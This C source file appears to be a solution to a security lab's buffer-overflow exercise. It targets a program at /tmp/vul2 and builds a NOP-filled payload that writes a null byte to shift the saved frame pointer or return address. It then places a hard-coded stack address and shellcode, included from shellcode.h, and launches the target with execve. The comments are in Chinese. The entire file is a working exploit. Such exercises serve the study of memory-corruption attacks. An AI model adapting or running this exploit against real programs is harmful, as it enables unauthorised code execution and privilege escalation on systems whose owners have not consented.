#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/vul2"

int main(void)
{
  	char payload[201];
  	int i;

	for (i = 0; i <= 200; i++) {
		payload[i] = '\x90';				// 填充nop
	}
	payload[200] = 0;						// 填充0使返回地址改变

	int offset  = 0xbffffd00 - 0xbffffcb8;	// 新返回地址到buf[0]的偏移量
	for (i = offset; i < offset + 4; i++) {
		payload[i] = '\xff';				// 标志，便于找到地址
	}
	payload[offset + 4] = '\x08';			// 填充shellcode地址
	payload[offset + 5] = '\xfd';
	payload[offset + 6] = '\xff';
	payload[offset + 7] = '\xbf';
	
	memcpy(payload + offset + 4 + 4, shellcode, strlen(shellcode));	// 填充shellcode

  	char *args[] = { TARGET, payload, NULL };
  	char *env[] = { NULL };

  	execve(TARGET, args, env);
  	fprintf(stderr, "execve failed.\n");

	return 0;
}
